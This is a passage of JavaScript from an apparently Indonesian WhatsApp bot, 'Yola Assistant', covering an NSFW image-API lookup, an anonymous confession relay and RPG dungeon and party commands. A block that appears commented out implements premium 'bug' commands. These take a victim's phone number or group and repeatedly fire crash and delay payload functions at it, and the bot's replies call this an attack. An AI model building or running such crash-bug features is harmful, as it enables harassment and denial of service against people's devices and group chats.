                            apiUrl: 'https://api.nekorinn.my.id/waifuim/oral',
                            buttonText: '➡️ Oral Lagi!'
                        },
                        'wass': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/ass',
                            buttonText: '➡️ Ass Lagi!'
                        },
                        'wwaifu': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/waifu',
                            buttonText: '➡️ Waifu Lagi!'
                        },
                        'wmilf': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/milf',
                            buttonText: '➡️ Milf Lagi!'
                        },
                        'hneko': {
                            apiUrl: 'https://waifu.pics/api/nsfw/neko',
                            buttonText: '➡️ Neko Lagi!'
                        },
                        'nwaifu': {
                            apiUrl: 'https://waifu.pics/api/nsfw/waifu',
                            buttonText: '➡️ Waifu Lagi!'
                        },
                        'trap': {
                            apiUrl: 'https://waifu.pics/api/nsfw/trap',
                            buttonText: '➡️ Trap Lagi!'
                        },
                        'gasm': {
                            apiUrl: 'https://nekos.life/api/v2/img/gasm',
                            buttonText: '➡️ Gasm Lagi!'
                        },
                        'milf': {
                            apiUrl: 'https://waifu.pics/api/nsfw/milf',
                            buttonText: '➡️ Milf Lagi!'
                        }
                    };
                    if (nsfwMap[originalCommand]) {
                        apiUrl = nsfwMap[originalCommand].apiUrl;
                        buttonText = nsfwMap[originalCommand].buttonText;
                        nsfwCommandName = capital(originalCommand);
                    } else {
                        return reply("────୨ Yola Assistant ৎ────\nPerintah NSFW berikutnya tidak dikenal.\n────୨ Yola Assistant ৎ────");
                    }
                }
                await handleNsfwNextButton(yola, m, nsfwCommandName, apiUrl, buttonText, isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, originalCommand));
            }
            break;

            case 'confess': {
                if (!text || !text.includes('.')) return reply(`────୨ Yola Assistant ৎ────\nFormat salah. Contoh: ${prefix}confess 6287729850738.Pesan rahasia ini.Nama Pengirim/sembunyi\n────୨ Yola Assistant ৎ────`);

                const parts = text.split('.');
                if (parts.length < 3) return reply(`────୨ Yola Assistant ৎ────\nFormat salah. Contoh: ${prefix}confess 6287729850738.Pesan rahasia ini.Nama Pengirim/sembunyi\n────୨ Yola Assistant ৎ────`);

                let targetNumber = parts[0].replace(/[^0-9]/g, '');
                if (!targetNumber) return reply(`────୨ Yola Assistant ৎ────\nNomor target tidak valid.\n────୨ Yola Assistant ৎ────`);
                if (targetNumber.startsWith('0')) targetNumber = '62' + targetNumber.substring(1);
                const targetJid = `${targetNumber}@s.whatsapp.net`;
                const confessMessage = parts[1].trim();
                const senderNameOption = parts[2].trim();
                const senderName = senderNameOption.toLowerCase() === 'sembunyi' ? 'Anonim' : senderNameOption;

                if (targetJid === m.sender) return reply(`────୨ Yola Assistant ৎ────\nTidak bisa mengirim confess ke diri sendiri, Kak.\n────୨ Yola Assistant ৎ────`);

                let checkTarget = await yola.onWhatsApp(targetJid);
                if (!checkTarget?.[0]?.exists) return reply(`────୨ Yola Assistant ৎ────\nNomor target tidak terdaftar di WhatsApp.\n────୨ Yola Assistant ৎ────`);

                const confessId = `confess_${m.sender.split('@')[0]}_${targetJid.split('@')[0]}_${Date.now()}`;
                pendingConfesses[confessId] = {
                    confessId: confessId,
                    sender: m.sender,
                    target: targetJid,
                    message: confessMessage,
                    senderName: senderName,
                    timestamp: Date.now(),
                    botMessageKey: null // To store the key of the message sent to the target
                };
                savePendingConfesses();

                let confessText = `────୨ Yola Assistant ৎ────\n💌 *Pesan Confess dari ${senderName}!* 💌\n\n"${confessMessage}"\n\nBalas pesan ini untuk membalas confess (Balasan akan dikirim anonim kepada pengirim confess asli).\n────୨ Yola Assistant ৎ────`;

                const confessMsg = await yola.sendMessage(targetJid, {
                    text: confessText,
                    contextInfo: defaultContextInfoBuilder(pushname, command)
                });
                await yola.sendMessage(confessMsg.key.remoteJid, { react: { text: "💌", key: confessMsg.key }});

                pendingConfesses[confessId].botMessageKey = confessMsg.key;
                savePendingConfesses();

                reply(`────୨ Yola Assistant ৎ────\n✅ Confess berhasil dikirim ke ${targetNumber}! Semoga dia tahu perasaan Kakak ya! >_<\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'handle_confess_reply': {
                if (!m.quoted || !m.quoted.fromMe || !m.quoted.id) return; // Not a reply to bot's message or not from bot

                const quotedText = m.quoted.text;
                // Find the confess message by its content and message key
                const targetConfess = Object.values(pendingConfesses).find(confess => 
                   confess.botMessageKey && 
                   confess.botMessageKey.id === m.quoted.id &&
                   confess.botMessageKey.remoteJid === m.quoted.chat
                );

                if (!targetConfess) {
                    return reply(`────୨ Yola Assistant ৎ────\nMaaf, Yola tidak dapat menemukan confess yang Kakak balas ini. Mungkin sudah kadaluarsa atau tidak valid.\n────୨ Yola Assistant ৎ────`);
                }

                const replyMessage = text;
                const senderOfReply = m.sender; // The one replying to the confess
                const originalSender = targetConfess.sender; // The one who sent the original confess
                const originalSenderName = targetConfess.senderName === 'Anonim' ? 'Seseorang' : targetConfess.senderName;
                const targetReceiverJid = targetConfess.target; // The original recipient of the confess (who is now replying)
                const targetReceiverName = registeredUsers[targetReceiverJid]?.name || targetReceiverJid.split('@')[0];

                if (senderOfReply !== targetReceiverJid) {
                    return reply(`────୨ Yola Assistant ৎ────\nIni bukan pesan confess yang ditujukan kepada Kakak, jadi Kakak tidak bisa membalasnya.\n────୨ Yola Assistant ৎ────`);
                }
                
                const replyNotificationToOriginalSender = `────୨ Yola Assistant ৎ────\n🔔 *Balasan untuk Confess Kakak dari ${targetReceiverName}!* 🔔\n\nConfess Kakak: "${targetConfess.message}"\n\nBalasan: "${replyMessage}"\n\nSemoga ini kabar baik yaa! ✨\n────୨ Yola Assistant ৎ────`;
                await yola.sendMessage(originalSender, {
                    text: replyNotificationToOriginalSender,
                    contextInfo: defaultContextInfoBuilder(pushname, command)
                });

                reply(`────୨ Yola Assistant ৎ────\n✅ Balasan Kakak sudah Yola kirimkan kepada pengirim confess!\n────୨ Yola Assistant ৎ────`);
                delete pendingConfesses[targetConfess.confessId]; // Remove from pending after reply
                savePendingConfesses();
            }
            break;

            case 'lxz-crash':
            case 'lxz-fc':
            case 'lxz-papan':
            case 'lxz-layy':
            case 'lxz-hmph': {
                if (!isPremium) return reply("────୨ Yola Assistant ৎ────\n*[ 403 ]* Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────");
                if (!q) return reply(`────୨ Yola Assistant ৎ────\nContoh: ${prefix + command} 628xxx\n────୨ Yola Assistant ৎ────`);
                let targetNumber = q.replace(/[^0-9]/g, "");
                if (!targetNumber || targetNumber.length < 9) return reply("────୨ Yola Assistant ৎ────\nNomornya salah atau kependekan nih, Kak.\n────୨ Yola Assistant ৎ────");
                if ([botNumber.split('@')[0], ...global.owner.map(v => v.replace(/[^0-9]/g, '')), ...OwnerR.map(v => v.split('@')[0])].includes(targetNumber)) {
                    return reply("────୨ Yola Assistant ৎ────\n💢 Hmph! Gak boleh kirim bug ke Owner atau Yola sendiri!\n────୨ Yola Assistant ৎ────");
                }
                let target = targetNumber + "@s.whatsapp.net";
                let bugType = command;
                let confirmTimestamp = Date.now();
                const link_gambar_Confirm = MENU_THUMBNAILS.bugmenu || getRandomThumbnailUrl();
                let confirmTitle = `\`〔 🚨 Konfirmasi Bug dari Yola 🚨 〕\``;
                let confirmFooterContent = `*Targetnya:* ${target}\n*Tipe Bug-nya:* .${bugType}\n\nYakin mau Yola kirim, Kak?`;

                if (currentMenuStyle === 'V1') {
                    let buttonsConfirm = [{
                        buttonId: `confirm_bug_${bugType}_${targetNumber}_${confirmTimestamp}`,
                        buttonText: {
                            displayText: "✅ Iya, Kirim!"
                        },
                        type: 1
                    }, {
                        buttonId: `cancel_bug_${bugType}_${targetNumber}_${confirmTimestamp}`,
                        buttonText: {
                            displayText: "❌ Gak Jadi Deh"
                        },
                        type: 1
                    }];
                    await yola.sendMessage(m.chat, {
                        image: {
                            url: link_gambar_Confirm
                        },
                        caption: confirmTitle,
                        footer: confirmFooterContent,
                        buttons: buttonsConfirm,
                        headerType: 4,
                        contextInfo: defaultContextInfoBuilder(pushname, 'bugmenu')
                    }, {
                        quoted: m
                    });
                } else {
                    await reply(`────୨ Yola Assistant ৎ────\n${confirmTitle}\n${confirmFooterContent}\n\nKetik:\n • \`${prefix}confirm_bug ${bugType} ${targetNumber} ${confirmTimestamp}\` (untuk kirim)\n • \`${prefix}cancel_bug ${bugType} ${targetNumber} ${confirmTimestamp}\` (untuk batal)\n────୨ Yola Assistant ৎ────`, defaultContextInfoBuilder(pushname, 'bugmenu'));
                }
            }
            break;
            case 'handle_confirm_bug':
            case 'confirm_bug': {
                if (!isPremium) return reply("────୨ Yola Assistant ৎ────\n*[ 403 ]* Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────");
                const parts = body.startsWith(prefix) ? args : body.split('_');
                const bugType = parts[command === 'confirm_bug' ? 0 : 2];
                const targetNumber = parts[command === 'confirm_bug' ? 1 : 3];
                const timestamp = parts[command === 'confirm_bug' ? 2 : 4];

                if (!availableBugTypes.includes(bugType) || !targetNumber || !timestamp) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, datanya gak lengkap atau gak valid buat konfirmasi bug.\n────୨ Yola Assistant ৎ────");
                }
                let target = targetNumber + "@s.whatsapp.net";
                reply(`────୨ Yola Assistant ৎ────\n🔥 Oke! Yola mulai serangan *${bugType}* ke *${targetNumber}*... Ini mungkin butuh waktu yaa, Kak!\n────୨ Yola Assistant ৎ────`);
                await yola.sendMessage(m.chat, {
                    react: {
                        text: "💣",
                        key: m.key
                    }
                });
                await sleep(1500);
                try {
                    switch (bugType) {
                        case "lxz-crash":
                            for (let i = 0; i < 10; i++) {
                                await LayX(target);
                                await sleep(100);
                            }
                            break;
                        case "lxz-fc":
                            for (let i = 0; i < 5; i++) {
                                await satan(target);
                                await sleep(100);
                            }
                            break;
                        case "lxz-papan":
                            for (let i = 0; i < 7; i++) {
                                await SqlXVnm31(target);
                                await sleep(100);
                            }
                            break;
                        case "lxz-layy":
                            for (let i = 0; i < 3; i++) {
                                await DelayL(target);
                                await sleep(100);
                            }
                            break;
                        case "lxz-hmph":
                            for (let i = 0; i < 4; i++) {
                                await delaynew(target);
                                await sleep(100);
                            }
                            break;
                        default:
                            throw new Error("Tipe bug gak dikenal.");
                    }
                    await sleep(2000);
                    reply(`────୨ Yola Assistant ৎ────\n✅ Serangan *${bugType}* ke *${targetNumber}* udah Yola selesai kirim! Efeknya tergantung perangkat target yaa~\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "💥",
                            key: m.key
                        }
                    });
                } catch (error) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, gagal kirim serangan *${bugType}* ke *${targetNumber}* nih, Kak.\nError: ${error.message}\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "❌",
                            key: m.key
                        }
                    });
                }
            }
            break;
            case 'handle_cancel_bug':
            case 'cancel_bug': {
                if (!isPremium) return reply("────୨ Yola Assistant ৎ────\n*[ 403 ]* Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────");
                const parts = body.startsWith(prefix) ? args : body.split('_');
                const bugType = parts[command === 'cancel_bug' ? 0 : 2];
                const targetNumber = parts[command === 'cancel_bug' ? 1 : 3];
                if (!bugType || !targetNumber) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, datanya gak lengkap buat batalin bug.\n────୨ Yola Assistant ৎ────");
                }
                reply(`────୨ Yola Assistant ৎ────\n👍 Oke! Serangan *${bugType}* ke *${targetNumber}* udah Yola batalin. Aman deh~\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'yola-lxz':
            case 'papanawok': {
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                if (!isBot) return reply(`────୨ Yola Assistant ৎ────\n*Fitur ini cuma bisa dari nomor Yola langsung yaa, Kak.*\n────୨ Yola Assistant ৎ────`);
                if (m.isGroup) return reply(`────୨ Yola Assistant ৎ────\n*Fitur ini cuma bisa di chat pribadi sama Yola yaa, Kak.*\n────୨ Yola Assistant ৎ────`);
                reply(`────୨ Yola Assistant ৎ────\n🔥 *Bug Brutal (${command}) lagi Yola siapin... Hati-hati yaa!* 🔥\n────୨ Yola Assistant ৎ────`);
                try {
                    switch (command) {
                        case "yola-lxz":
                            for (let i = 0; i < 20; i++) {
                                await OverloadCursor(yola, m.chat);
                                await sleep(100);
                            }
                            break;
                        case "papanawok":
                            for (let i = 0; i < 20; i++) {
                                await crashcursor(yola, m.chat);
                                await sleep(100);
                            }
                            break;
                    }
                    reply(`────୨ Yola Assistant ৎ────\n✅ Bug *${command}* udah Yola kirim! Semoga berhasil yaa~ 😉\n────୨ Yola Assistant ৎ────`);
                } catch (error) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal kirim bug-nya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'yola-gcx':
            case 'yola-cgx': {
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                if (!m.isGroup) return reply("────୨ Yola Assistant ৎ────\n❌ Fitur ini khusus buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────");
                if (!isBot) return reply(`────୨ Yola Assistant ৎ────\n*Fitur ini cuma bisa dari nomor Yola langsung yaa, Kak.*\n────୨ Yola Assistant ৎ────`);
                reply(`────୨ Yola Assistant ৎ────\n🔥 *Bug Grup (${command}) lagi Yola siapin buat grup ini... Hati-hati yaa semua!* 🔥\n────୨ Yola Assistant ৎ────`);
                try {
                    if (command === "yola-gcx") {
                        for (let i = 0; i < 4; i++) {
                            await SpaceGroup(yola, m.chat);
                            await sleep(500);
                        }
                    } else if (command === "yola-cgx") {
                        for (let i = 0; i < 3; i++) {
                            await SpaceGroup(yola, m.chat);
                            await sleep(400);
                            await mentionSw(yola, m.chat);
                            await sleep(400);
                        }
                    }
                    reply(`────୨ Yola Assistant ৎ────\n✅ Bug Grup *${command}* udah Yola kirim ke grup ini! Semoga berhasil yaa~ 😉\n────୨ Yola Assistant ৎ────`);
                } catch (error) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal kirim bug grupnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;*/

            case 'questlist': {
                let questText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Daftar Quest yang Tersedia buat Rank Kakak (${getRankByTotalXp(userRPG.totalXpEarned) || 'G'})* 📜\n│✧\n`;
                const availableQuests = Object.entries(rpgQuests)
                    .filter(([id, quest]) => {
                        return !userRPG.completedQuests?.[id] && (!quest.levelRequirement || userRPG.level >= quest.levelRequirement);
                    })
                    .map(([id, quest]) => `│✧ *ID: \`${id}\` - ${quest.name || 'Quest Tanpa Nama'}* (Lv.${quest.levelRequirement || 1})\n│✧    _${quest.description}_\n`);

                if (availableQuests.length === 0) {
                    questText += `│✧ _Aduh, kayaknya gak ada quest yang cocok buat Kakak sekarang, atau semua quest udah Kakak selesain! Keren!_\n`;
                } else {
                    questText += availableQuests.join('\n');
                }
                questText += `│✧\n│✧ Ketik *${prefix}acceptquest [id_quest]* buat nerima questnya yaa~\n│✧ Naikin Rank Kakak buat dapetin quest yang lebih seru lagi! Semangat! >_<\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${questText}`);
            }
            break;

            case 'dungeonlist': {
                let dungeonText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Daftar Dungeon yang Bisa Kakak Masukin Sesuai Rank (${getRankByTotalXp(userRPG.totalXpEarned) || 'G'})* 🏰\n│✧\n`;
                const availableDungeons = rpgDungeons
                    .filter(dungeon => {
                        return !dungeon.levelRequirement || userRPG.level >= dungeon.levelRequirement;
                    })
                    .map(dungeon => `│✧ *ID: \`${dungeon.id}\` - ${dungeon.name}* (Lv.${dungeon.levelRequirement || 1})\n│✧    _${dungeon.description}_\n│✧    ⏳ Durasi: ${dungeon.duration / 1000} detik\n│✧    🏆 Hadiah: ${dungeon.rewards.goldMin}-${dungeon.rewards.goldMax}🪙, ${dungeon.rewards.xpMin}-${dungeon.rewards.xpMax}✨`);

                if (availableDungeons.length === 0) {
                    dungeonText += `│✧ _Hmph! Kayaknya gak ada dungeon yang cocok buat level/rank Kakak sekarang deh...\n`;
                } else {
                    dungeonText += availableDungeons.join('\n│✧\n');
                }
                dungeonText += `│✧\n│✧ Buat masuk sendiri: *${prefix}dungeon solo [id_dungeon]*\n│✧ Buat masuk bareng party: *${prefix}dungeon party [id_dungeon]*\n│✧\n│✧ Naikin Rank Kakak yaa biar bisa masuk dungeon yang lebih menantang! Semangat! ✨\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${dungeonText}`);
            }
            break;

            case 'dungeon': {
                if (!args[0] || !args[1]) return reply(`────୨ Yola Assistant ৎ────\nFormatnya salah nih, Kak. Coba gini:\n*${prefix}dungeon solo [id_dungeon]*\n*${prefix}dungeon party [id_dungeon]*\n────୨ Yola Assistant ৎ────`);
                const type = args[0].toLowerCase();
                const dungeonId = args[1];

                if (userRPG.currentAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain nih (${userRPG.currentAction.type.replace(/_/g, ' ')}). Selesain dulu yaa!\n────୨ Yola Assistant ৎ────`);
                if (userRPG.pendingAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi nunggu mau ngapain gitu (${userRPG.pendingAction.type.replace(/_/g, ' ')}). Coba ketik ${prefix}dungeonstart / ${prefix}queststart atau batalin dulu.\n────୨ Yola Assistant ৎ────`);

                const dungeonData = rpgDungeons.find(d => d.id === dungeonId);
                if (!dungeonData) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Dungeon dengan ID \`${dungeonId}\` gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (dungeonData.levelRequirement && userRPG.level < dungeonData.levelRequirement) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, level Kakak (${userRPG.level}) belum cukup buat masuk *${dungeonData.name}* (Minimal Lv.${dungeonData.levelRequirement} yaa).\n────୨ Yola Assistant ৎ────`);
                const currentRankValue = rankThresholds[getRankByTotalXp(userRPG.totalXpEarned)] || 0;
                const requiredRankValue = rankThresholds[dungeonData.rankRequirement] || 0;
                if (dungeonData.rankRequirement && currentRankValue < requiredRankValue) return reply(`────୨ Yola Assistant ৎ────\n❌ Rank Kakak (${getRankByTotalXp(userRPG.totalXpEarned)}) belum cukup buat masuk *${dungeonData.name}* (Minimal Rank ${dungeonData.rankRequirement}).\n────୨ Yola Assistant ৎ────`);


                const now = Date.now();
                const lastDungeonEntry = userRPG.lastDungeon[dungeonId] || 0;
                const cooldownTime = dungeonData.cooldown || 0;
                if (now - lastDungeonEntry < cooldownTime) {
                    const remainingTime = Math.ceil((cooldownTime - (now - lastDungeonEntry)) / 1000);
                    const minutes = Math.floor(remainingTime / 60);
                    const seconds = remainingTime % 60;
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak baru aja selesaiin dungeon ini. Istirahat dulu yaa~ Cooldown: *${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik* lagi.\n────୨ Yola Assistant ৎ────`);
                }


                if (type === 'solo') {
                    if (dungeonData.isPartyOnly) return reply(`────୨ Yola Assistant ৎ────\n❌ Dungeon *${dungeonData.name}* hanya bisa dimasuki bersama party!\n────୨ Yola Assistant ৎ────`);
                    userRPG.pendingAction = {
                        type: 'dungeon_solo_pending',
                        dungeonId: dungeonId,
                        startTime: now
                    };
                    saveUsers(m.sender);
                    await reply(`────୨ Yola Assistant ৎ────\n⚔️ Oke! Kakak siap-siap masuk *${dungeonData.name}* sendirian! Semangat yaa!\nKetik *${prefix}dungeonstart* buat mulai petualangannya.\n────୨ Yola Assistant ৎ────`);
                } else if (type === 'party') {
                    if (!userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak harus punya party dulu buat masuk dungeon party.\n────୨ Yola Assistant ৎ────");
                    const partyData = parties[userRPG.partyId];
                    if (!partyData) return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data party-nya gak ketemu nih...\n────୨ Yola Assistant ৎ────");
                    if (partyData.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader party yang bisa ngajak masuk dungeon party.\n────୨ Yola Assistant ৎ────");
                    if (partyData.currentDungeon) return reply("────୨ Yola Assistant ৎ────\n⚔️ Party Kakak udah di dalem dungeon kok!\n────୨ Yola Assistant ৎ────");

                    let busyMembers = [];
                    partyData.members.forEach(memberJid => {
                        const memberRPG = registeredUsers[memberJid]?.rpg;
                        if (memberRPG && (memberRPG.currentAction || memberRPG.pendingAction)) {
                            busyMembers.push(`@${memberJid.split('@')[0]}`);
                        }
                    });
                    if (busyMembers.length > 0) {
                        return reply(`────୨ Yola Assistant ৎ────\n⚠️ Aduh, party-nya gak bisa siap-siap nih soalnya anggota ini lagi sibuk:\n${busyMembers.join('\n')}\n────୨ Yola Assistant ৎ────`, {
                            mentions: partyData.members
                        });
                    }

                    let failedMembers = [];
                    let canStart = true;
                    let mentionedMembers = [];
                    partyData.members.forEach(memberJid => {
                        mentionedMembers.push(memberJid);
                        const memberRPGData = registeredUsers[memberJid];
                        if (memberRPGData && memberRPGData.rpg) {
                            const memberRPG = memberRPGData.rpg;
                            if (memberRPG.level < dungeonData.levelRequirement) {
                                failedMembers.push(`@${memberJid.split('@')[0]} (Lv.${memberRPG.level} < ${dungeonData.levelRequirement})`);
                                canStart = false;
                            }
                            const memberRankValue = rankThresholds[getRankByTotalXp(memberRPG.totalXpEarned)] || 0;
                            if (dungeonData.rankRequirement && memberRankValue < requiredRankValue) {
                                failedMembers.push(`@${memberJid.split('@')[0]} (Rank ${getRankByTotalXp(memberRPG.totalXpEarned)} < ${dungeonData.rankRequirement})`);
                                canStart = false;
                            }

                        } else {
                            failedMembers.push(`@${memberJid.split('@')[0]} (Datanya gak ketemu)`);
                            canStart = false;
                        }
                    });

                    if (!canStart) {
                        return reply(`────୨ Yola Assistant ৎ────\n⚠️ Aduh, party-nya gak bisa masuk *${dungeonData.name}* gara-gara ini nih:\n${failedMembers.join('\n')}\n────୨ Yola Assistant ৎ────`, {
                            mentions: mentionedMembers
                        });
                    }

                    partyData.members.forEach(memberJid => {
                        if (registeredUsers[memberJid]?.rpg) {
                            registeredUsers[memberJid].rpg.pendingAction = {
                                type: 'dungeon_party_pending',
                                dungeonId: dungeonId,
                                partyId: userRPG.partyId,
                                startTime: now
                            };
                            saveUsers(memberJid);
                        }
                    });

                    partyData.currentDungeon = {
                        id: dungeonId,
                        startTime: now
                    };
                    saveParties();

                    await reply(`────୨ Yola Assistant ৎ────\n🎉 Party Kakak siap-siap masuk *${dungeonData.name}* bareng-bareng! Seru! 🤝\nLeader, ketik *${prefix}dungeonstart* buat mulai petualangannya yaa~\n────୨ Yola Assistant ৎ────`, {
                        mentions: mentionedMembers
                    });


                } else {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Tipe dungeonnya salah nih, Kak. Pilih 'solo' atau 'party' yaa.\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;

            case 'dungeonstart': {
                if (!userRPG.pendingAction || !userRPG.pendingAction.type.startsWith('dungeon_')) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Kakak belum siap-siap masuk dungeon. Coba pakai `.dungeon solo/party [id]` dulu yaa.\n────୨ Yola Assistant ৎ────");
                }
                if (userRPG.currentAction) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain nih (${userRPG.currentAction.type.replace(/_/g, ' ')}). Selesain dulu yaa!\n────୨ Yola Assistant ৎ────`);
                }

                const pending = userRPG.pendingAction;
                const dungeonId = pending.dungeonId;
                const dungeonData = rpgDungeons.find(d => d.id === dungeonId);
                if (!dungeonData) {
                    userRPG.pendingAction = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data dungeon buat aksi yang tertunda gak ketemu nih... Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }

                const now = Date.now();
                const endTime = now + dungeonData.duration;

                if (pending.type === 'dungeon_solo_pending') {
                    if (dungeonData.isPartyOnly) {
                        userRPG.pendingAction = null;
                        saveUsers(m.sender);
                        return reply(`────୨ Yola Assistant ৎ────\n❌ Dungeon *${dungeonData.name}* hanya bisa dimasuki bersama party!\n────୨ Yola Assistant ৎ────`);
                    }
                    userRPG.currentAction = {
                        type: 'dungeon_solo_active',
                        dungeonId: dungeonId,
                        startTime: now,
                        endTime: endTime
                    };
                    userRPG.pendingAction = null;
                    saveUsers(m.sender);
                    const initialMsg = await reply(`────୨ Yola Assistant ৎ────\n🚀 Petualangan solo di *${dungeonData.name}* dimulai! Bakal berlangsung selama ${dungeonData.duration / 1000} detik. Semangat! ✨\n────୨ Yola Assistant ৎ────`);
                    runSimulation(m.sender, 'dungeon', dungeonId, endTime, m.chat, initialMsg.key);

                } else if (pending.type === 'dungeon_party_pending') {
                    const partyData = parties[pending.partyId];
                    if (!partyData) {
                        userRPG.pendingAction = null;
                        saveUsers(m.sender);
                        return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data party-nya gak ketemu nih... Aksinya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                    }
                    if (partyData.leader !== m.sender) {
                        return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader party yang bisa mulaiin dungeon yang udah disiapin.\n────୨ Yola Assistant ৎ────");
                    }
                    if (partyData.currentDungeon) {
                        return reply("────୨ Yola Assistant ৎ────\n⚔️ Party Kakak udah di dalem dungeon kok!\n────୨ Yola Assistant ৎ────");
                    }

                    let successMembersJid = [];
                    let failedMembersInfo = [];

                    partyData.members.forEach(memberJid => {
                        const memberRPG = registeredUsers[memberJid]?.rpg;
                        if (memberRPG && memberRPG.pendingAction?.type === 'dungeon_party_pending' && memberRPG.pendingAction?.dungeonId === dungeonId && !memberRPG.currentAction) {
                            const memberRankValue = rankThresholds[getRankByTotalXp(memberRPG.totalXpEarned)] || 0;
                            const requiredRankValue = rankThresholds[dungeonData.rankRequirement] || 0;

                            if (memberRPG.level < dungeonData.levelRequirement || (dungeonData.rankRequirement && memberRankValue < requiredRankValue)) {
                                failedMembersInfo.push(`@${memberJid.split('@')[0]} (Lv.${memberRPG.level} atau Rank ${getRankByTotalXp(memberRPG.totalXpEarned)} < ${dungeonData.levelRequirement}/${dungeonData.rankRequirement})`);
                                memberRPG.pendingAction = null;
                                saveUsers(memberJid);
                            } else {
                                successMembersJid.push(memberJid);
                            }
                        } else {
                            failedMembersInfo.push(`@${memberJid.split('@')[0]} (kayaknya gak siap atau lagi sibuk)`);
                             // Clear pending action if it's for this dungeon but they were busy
                            if (memberRPG?.pendingAction?.type === 'dungeon_party_pending' && memberRPG.pendingAction?.dungeonId === dungeonId) {
                                memberRPG.pendingAction = null;
                                saveUsers(memberJid);
                            }
                        }
                    });

                    if (failedMembersInfo.length > 0 && successMembersJid.length > 0) {
                        await reply(`────୨ Yola Assistant ৎ────\n⚠️ Aduh, ada beberapa anggota yang gak siap atau ranknya kurang pas mau mulai:\n${failedMembersInfo.join('\n')}\nDungeonnya cuma dimulai sama anggota yang siap aja yaa.\n────୨ Yola Assistant ৎ────`, {
                            mentions: partyData.members
                        });
                    } else if (successMembersJid.length === 0) {
                        partyData.members.forEach(memberJid => {
                            if (registeredUsers[memberJid]?.rpg?.pendingAction?.type === 'dungeon_party_pending' && registeredUsers[memberJid]?.rpg?.pendingAction?.dungeonId === dungeonId) {
                                registeredUsers[memberJid].rpg.pendingAction = null;
                                saveUsers(memberJid);
                            }
                        });
                        return reply("────୨ Yola Assistant ৎ────\n❌ Gak ada anggota yang siap nih, jadi dungeon party-nya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                    }


                     const initialMsg = await reply(`────୨ Yola Assistant ৎ────\n🚀 Petualangan party di *${dungeonData.name}* dimulai! Bakal berlangsung selama ${dungeonData.duration / 1000} detik. Semangat semuanyaa! ✨${successMembersJid.length > 1 ? `\nDimulai bersama ${successMembersJid.map(jid => `@${jid.split('@')[0]}`).join(', ')}.` : ''}\n────୨ Yola Assistant ৎ────`, { mentions: successMembersJid });

                    successMembersJid.forEach(memberJid => {
                        registeredUsers[memberJid].rpg.currentAction = {
                            type: 'dungeon_party_active',
                            dungeonId: dungeonId,
                            partyId: pending.partyId,
                            startTime: now,
                            endTime: endTime
                        };
                        registeredUsers[memberJid].rpg.pendingAction = null;
                        saveUsers(memberJid);
                        // Only run simulation for the leader, as the message is shared
                        if (memberJid === m.sender) {
                           runSimulation(memberJid, 'dungeon', dungeonId, endTime, m.chat, initialMsg.key);
                        }
                    });

                    partyData.currentDungeon = {
                        id: dungeonId,
                        startTime: now,
                        endTime: endTime
                    };
                    saveParties();

                } else {
                    userRPG.pendingAction = null;
                    saveUsers(m.sender);
                    reply("────୨ Yola Assistant ৎ────\n❌ Tipe aksi yang tertunda gak Yola kenal nih... Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }
            }
            break;

            case 'dungeoncomplete': {
                if (!userRPG.currentAction || !userRPG.currentAction.type.startsWith('dungeon_') || !userRPG.currentAction.type.endsWith('_active')) {
